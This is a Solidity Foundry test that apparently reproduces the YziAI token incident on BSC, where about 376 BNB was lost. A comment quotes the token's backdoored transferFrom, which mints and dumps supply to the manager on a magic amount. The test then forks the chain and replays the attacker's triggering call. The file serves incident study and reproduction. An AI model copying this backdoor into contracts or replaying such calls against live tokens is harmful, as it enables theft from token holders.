// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 376 BNB
// Attacker : https://bscscan.com/address/0x63fc3ff98de8d5ca900e68e6c6f41a7ca949c453
// Attack Contract :
// Vulnerable Contract : https://bscscan.com/address/0x7fdff64bf87bad52e6430bda30239bd182389ee3
// Attack Tx : https://bscscan.com/tx/0x4821392c0b27a4acc952ff51f07ed5dc74d4b67025c57232dae44e4fef1f30e8

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x7fdff64bf87bad52e6430bda30239bd182389ee3#code
/*
function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
    if(msg.sender == manager && amount == 1199002345) {
        _mint(address(this), supply * 10000);
        _approve(address(this), router, supply * 100000);

        path.push(address(this));
        path.push(IUniswapV2Router02(router).WETH());

        IUniswapV2Router02(router).swapExactTokensForETH(
            balanceOf(to) * 1000,
            1,
            path,
            manager,
            block.timestamp + 1e10
        );
        return true;
    }
    // ...
}
 */

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1905528525785805027
// Hacking God : N/A

address constant wBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant CAKE_LP = 0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919;
address constant YziAI = 0x7fDfF64Bf87bad52e6430BDa30239bD182389Ee3;

contract YziAIToken_exp is BaseTestWithBalanceLog {
    address attacker = 0x63FC3fF98De8d5cA900e68E6c6F41a7CA949c453;
    uint256 blocknumToForkFrom = 47_838_545 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        // Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        // fundingToken = BSC_USD;

        vm.label(attacker, "Attacker");
        vm.label(wBNB, "WBNB");
        vm.label(YziAI, "YziAI");
        vm.label(CAKE_LP, "0xc355_Cake-LP");
    }

    function testExploit() public {
        emit log_named_decimal_uint("BNB balance before attack", attacker.balance, 18);
        vm.startPrank(attacker);
        IERC20(YziAI).transferFrom(CAKE_LP, CAKE_LP, 1_199_002_345);
        vm.stopPrank();
        emit log_named_decimal_uint("BNB balance after attack", attacker.balance, 18);
    }
}
